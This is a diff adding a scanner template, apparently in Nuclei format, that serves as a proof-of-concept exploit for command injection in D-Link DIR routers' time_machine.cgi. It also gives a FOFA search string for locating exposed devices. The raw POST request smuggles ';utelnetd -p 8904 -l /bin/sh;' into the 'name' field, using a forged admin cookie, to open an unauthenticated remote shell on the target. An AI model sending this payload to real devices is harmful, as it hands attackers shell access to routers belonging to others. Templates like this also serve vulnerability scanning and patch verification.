@@ -1,0 +1,48 @@
+id: poc-gayvrgk4mp8x3o1g
+info:
+  name: D-Link time_machine.cgi存在命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gayvrgk4mp8x3o1g'
+  tags: rce,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gayvrgk4mp8x3o1g
+    fofa: '"D-Link-DIR"'
+http:
+- raw:
+  - 'POST /cgi-bin/time_machine.cgi HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0
+
+    Accept: */*
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate, br
+
+    Content-Type: application/x-www-form-urlencoded
+
+    X-Requested-With: XMLHttpRequest
+
+    Content-Length: 52
+
+    Origin: [http://192.168.0.32](http://192.168.0.32)
+
+    Connection: keep-alive
+
+    Referer: [http://192.168.0.32/web/backup_mgr/local_main.html](http://192.168.0.32/web/backup_mgr/local_main.html)
+
+    Cookie: username=admin
+
+    Priority: u=0
+
+
+    cmd=cgi_tm_del_share&name=;utelnetd -p 8904 -l /bin/sh;'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
